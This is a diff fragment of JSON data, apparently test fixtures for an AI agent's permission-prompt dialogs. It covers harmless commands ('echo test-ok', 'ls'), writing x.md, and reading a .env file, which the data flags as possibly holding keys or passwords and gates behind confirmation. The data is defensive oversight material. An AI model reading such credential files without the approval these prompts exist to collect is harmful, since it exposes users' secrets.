+        "motivo": "It asks because the session is on “Asks first”: every action that changes something goes through you.",
+        "nota": "Applies only to this request",
+        "unaVolta": "Allow once",
+        "terzo": null,
+        "negaEtichetta": "Deny"
+      },
+      "figlia-senza-politica": {
+        "badge": "Asks to run",
+        "bersaglio": "echo test-ok",
+        "perche": "It wants to run this command in the terminal:",
+        "codice": "echo test-ok",
+        "motivo": "",
+        "nota": "Applies only to this request",
+        "unaVolta": "Allow once",
+        "terzo": null,
+        "negaEtichetta": "Deny"
+      },
+      "figlia-permessi-illeggibili": {
+        "badge": "Asks to run",
+        "bersaglio": "ls",
+        "perche": "It wants to run this command in the terminal:",
+        "codice": "ls",
+        "motivo": "",
+        "nota": "Applies only to this request",
+        "unaVolta": "Allow once",
+        "terzo": {
+          "etichetta": "For this session",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Deny"
+      },
+      "figlia-cancello": {
+        "badge": "Asks to write",
+        "bersaglio": "x.md",
+        "perche": "It wants to write this file:",
+        "codice": "x.md",
+        "motivo": "It asks because the rule for “Writing a file” is “Ask for confirmation”, even with the session on “Full access”.",
+        "nota": "Applies only to this request",
+        "unaVolta": "Allow once",
+        "terzo": {
+          "etichetta": "For this session",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Deny"
+      },
+      "figlia-segreto-senza-politica": {
+        "badge": "Asks to read",
+        "bersaglio": ".env",
+        "perche": "It wants to read this file:",
+        "codice": ".env",
+        "motivo": "This read opens a file that may contain keys or passwords (.env): do you want me to do it?",
+        "nota": "Applies to the whole session",
+        "unaVolta": "Allow once",
+        "terzo": {
+          "etichetta": "Allow this path for the session",
+          "scelta": "percorso"
+        },
+        "negaEtichetta": "Deny"
+      }
+    },
+    "chi": {
+      "prima": "The agent “",
+      "dopo": "” is asking",
+      "senza": "An agent is asking"
+    }
+  }
+}
